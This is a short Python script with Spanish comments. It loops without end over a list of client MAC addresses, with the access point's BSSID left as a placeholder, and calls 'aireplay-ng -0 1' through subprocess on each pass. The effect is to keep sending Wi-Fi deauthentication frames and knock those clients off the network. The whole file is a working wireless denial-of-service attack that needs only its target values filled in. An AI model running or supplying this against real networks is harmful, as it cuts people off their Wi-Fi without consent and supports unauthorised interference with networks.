import subprocess
#clientes lleva en el valor todas las direcciones MAC a desautenticar
clientes={1:"", 2:"", 3:"", 4:"", 5:"", 6:"", 7:""}
conta=1
while True:
	cliente=clientes[conta]
	comando="aireplay-ng -0 1 -a <BSSID del AP> -c "+cliente+" wlan0mon"
	#print(comando)
	desautentica=subprocess.getoutput(comando)
	cadena=str(desautentica)
	print(cadena)
	conta+=1
	if(conta == 8):
		conta=1
	


